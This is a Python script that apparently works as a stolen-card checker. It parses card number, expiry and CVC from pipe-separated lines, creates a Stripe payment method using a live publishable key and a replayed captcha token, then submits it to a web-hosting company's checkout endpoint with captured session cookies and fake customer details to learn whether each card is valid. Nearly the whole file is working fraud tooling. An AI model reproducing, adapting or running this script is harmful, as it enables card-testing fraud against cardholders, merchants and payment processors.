import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests

	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=17bc66b5-43c4-42f4-b989-a1985fd258fa3417f4&muid=9561ddaf-1fc1-42fe-a624-2e3428cc0162b5832e&sid=8fe986d5-2633-45b5-b94a-90bbde39ecf98dd4b1&pasted_fields=number&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fclients.asurahosting.com&time_on_page=47606&key=pk_live_51K9x9oLI1SL4EGpUbktL84zF7JsJyzmVYeARDaWoHAhSOObtNBeBRtvNBRL8MJQFgrQ7QmYnFiQRDijzNGuiUkaN00xQybd4DF&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZUmByzeScjoNav-lH_cMVDX4ZXh9eO_L7ZOg2WU52HSDs59_t-B8Nhgj1tuw74u314893n_TM46bNeOKwm1FvrY5fWMl9yFolBT9shWWQKS-xUAM60ZwI1CrSsP1H0Ed7j_e_6d1NkRcGu0d6AevC80qD7xyFRo_M_GVgifcezXJ_cFnQKvPasCQDgKjJNzQMoigM7KLgUZB-NZaEgliPQpL7M3Ffmcys2hFEUi2K3mpK-IYF9vFMvwYpzSXvf4RNz5Ps58b5c38SGj67yqK0EfwdVN6Bxlc3eUqX1ga8BO1tSl5ved2ZWQykc_KZyqwPlmU8EpzuE9E-b8-RiENp-gJNW6LG3bEDBG17n0fns7xvLM5efOhG-jAZmHC6yualSRqiAqO5R3wCAYtvVJ1bmpkK1yydV3bEwvrZtkg_V109ruEfQ1s0WL8p_fN8k7cyUCm023rnZy4jPkyeiD2vD-_8mcc1u4u6T1TSCaeaptEnj5RhGSnWNDgadB5a1kiJtbcy0-gJpIvmINO-Y4Qp8WyPi41NnSY7PpCTTNL_09lJDFBuCc1D8zbZ90lVzbaWYhGYI-1x2kLOCyAzcyGxF3c-WdFYac0zsoCPYInR7JdLVQJL9GUiEcRdHLOdgEKpy9l3h7piVVvP31OlABfuy6tk1anvWFfC5IpVEMwQuWrkEwXloBOEa2dYmFPU-43la5KfaxBnx431kzsK5LXgb7oQ4AKDYUhT-uLSUFYBIrxxKB9agtUHMGqYrJ3wWxtlPYA847oi1zIqk-Vzf6UxLjGcbbWT2kCHraTfJqEbYxT0cchIOEJFDpOyulL2I4uBgUspP23ML_GYtQ-lVnrdEQfGh-F9MQsbNNY-cU5q7hFTv9BN1CXTCpzF6kY88nnPfi1mISHgkxHyPJJ-LSdDydk2GhmQv6fxu2sZVs_OfIZL62D8CyWQCf6Pac9pcyO-QDL5GhUeUMFb3of0Hc0k6D2Zm9hUpZS0A8zWKFUPORqVO2-3Z5zBKcu4Qm07Bah0Pg94VM_NtnypryotBqenkYzKlqvmIC9VOzyxwq98BnEuIeAy7kd5MblLzsUVdtI-MCt_KdP8O27infkrWqFgkt6R99KLl2cuD51z5hh2MOGkubjlsP9fyymL2uAAJ4uPsf2qpU09R4mVUZGv_XLXnSAWo6gm6e7sDllxOoJVjLGzClG9fy2pY4nlWReDEJ8nX2OGnezAFTpZrx-yXyPYqbpAzKVffEMqe1-ger2wUgizVMdc1eL49Gt16tek6AFyb0v_RX8YVPevuAaEWXlB6wguFxRJPyW7xVtvX6GA1HBTzvmSwjw85QDZpB-w66tmZl9KGy5n8wmF2VhYdE0d0in4WtmE-8yJPp4mUTvbQ-PNdaaUYjJVl7nlsCv-Ic86MAlbMGTe84_xiZwMULycAi3efGtWDq6v_rhueVpjq9IBQtYXqurskjt3pJag64ZOfjnAXPEiHGEGDCG_lHWOe9WnKk-0ybEL7l4qoXb_fSvYaR-U0T0S2rV55xj5XOQv4z-5OzB8U5TxwlcPBRwKE6_35yOHCSJYhf5peJlwNy-Ic7ZQzsmzaLCzhU-ih8x5l1DHR0_-sKOB_HQ2MSyz1AywKPW_KxnBNEKrH6GJzgvIHsQmS3ozE1CYPnBFULV_5jKgGe_7Hqs7zXoB88Qc6ngPPxdxCxYKL_JiyGGvlelZPE52zQajK5dQkSgM16wMjJYI6b5NHUtMOf2nFxN5usDlycM7flkxJC59_14ZPRTOjFmgDO0UcuhD379UER0DiHYD4PeTkCtzwhBCyHqjVkqG315_zSzb98lr-PTJoNlQCMTaH-xMovBrTvo432Rn5je1urHWtzgLdu17sEJmQ06c00qsFLgd1HdkiE_eJZ0BnBjLWhxPLssL2pUVuBeVrPwx0wsjKO-EGbYDK6rAyWmoB_yBukL6p1sopH6nRmZVHqcpS_sIw0Do7yg9SE9gSMqYotOjoOLG-tR5Hk5E3LnKH5AsqdR0WIoGYjPbUNwQZNCc1utzNUuinJ5QTjt08UMSdPSB9ox46A1gxiDzFZx5X0c6aU0vpjYklmqgHL-5QD7s2nGY1EO7ZfyNbwMPgX0mWsFd8qvjufDUkjHPMbyEimfb7oYb1QnTb9SWGmVtQXEoOo2V4cM5mVOTrqHNoYXJkX2lkzgMxg2-ia3KoNGE5ZWZkMTaicGQA.q2bZ0ycRVmSnhE66nWYrdxfHsbuqpU3AvAe2vjfRuZo'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return '#'
	import requests

	cookies = {
    '_gcl_aw': 'GCL.1716839412.Cj0KCQjw3tCyBhDBARIsAEY0XNk6MMc8FnMFR1BfpVQ0wzV4vTrtdafeWv4Y7ZfEeo0AKX7M0LqsnrUaAmPSEALw_wcB',
    '_gcl_gs': '2.1.k1$i1716839410',
    '_gcl_au': '1.1.922201026.1716839412',
    '_ga': 'GA1.1.555575236.1716839412',
    'cf_clearance': 'Z1lipoh4Q0xkE5FPHWZzmKl0uwW_pTcRPOjU6AmPTXY-1716839412-1.0.1.1-_mfO4k83t5c5.XnWTEwaYWzwB4Q.6fH.H3e_K5Q8wGQoX5uHp7Latevmu4Cq87VWQ84oZ9uDQZsIMOq.qC1rdw',
    'WHMCSakgme2xxDWj4': '64bd989cfc13ddbb96e94bed4b4e26c5',
    '__stripe_mid': '9561ddaf-1fc1-42fe-a624-2e3428cc0162b5832e',
    '__stripe_sid': '8fe986d5-2633-45b5-b94a-90bbde39ecf98dd4b1',
    '_ga_92WVCLVGV9': 'GS1.1.1716839412.1.1.1716839490.0.0.0',
    }

	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gcl_aw=GCL.1716839412.Cj0KCQjw3tCyBhDBARIsAEY0XNk6MMc8FnMFR1BfpVQ0wzV4vTrtdafeWv4Y7ZfEeo0AKX7M0LqsnrUaAmPSEALw_wcB; _gcl_gs=2.1.k1$i1716839410; _gcl_au=1.1.922201026.1716839412; _ga=GA1.1.555575236.1716839412; cf_clearance=Z1lipoh4Q0xkE5FPHWZzmKl0uwW_pTcRPOjU6AmPTXY-1716839412-1.0.1.1-_mfO4k83t5c5.XnWTEwaYWzwB4Q.6fH.H3e_K5Q8wGQoX5uHp7Latevmu4Cq87VWQ84oZ9uDQZsIMOq.qC1rdw; WHMCSakgme2xxDWj4=64bd989cfc13ddbb96e94bed4b4e26c5; __stripe_mid=9561ddaf-1fc1-42fe-a624-2e3428cc0162b5832e; __stripe_sid=8fe986d5-2633-45b5-b94a-90bbde39ecf98dd4b1; _ga_92WVCLVGV9=GS1.1.1716839412.1.1.1716839490.0.0.0',
    'origin': 'https://clients.asurahosting.com',
    'priority': 'u=1, i',
    'referer': 'https://clients.asurahosting.com/cart.php?a=checkout',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

	data = {
    f'token': 'e062cb7061bc9c3de1d287df4a46847c6ef9d32a',
    'submit': 'true',
    'custtype': 'existing',
    'account_id': '40225',
    'firstname': 'smoke',
    'lastname': 'smoke',
    'email': 'smoke250966@gmail.com',
    'country-calling-code-phonenumber': '249',
    'phonenumber': '1000000000',
    'companyname': '',
    'address1': 'ssssssssssssssss',
    'address2': 'as',
    'city': 'sssssssssssssssssssss',
    'state': 'ssssssssssssssssssss',
    'postcode': 'ssssssssssssssss',
    'country': 'SD',
    'applycredit': '1',
    'paymentmethod': 'stripe',
    'ccinfo': 'new',
    'ccdescription': '',
    'notes': '',
    'payment_method_id': id,
    }

	response = requests.post(
    'https://clients.asurahosting.com/index.php?rp=/stripe/payment/intent',
    cookies=cookies,
    headers=headers,
    data=data,
    ).json()
	try:
		ii=response['validation_feedback']
	except:
	    return 'success'
	return ii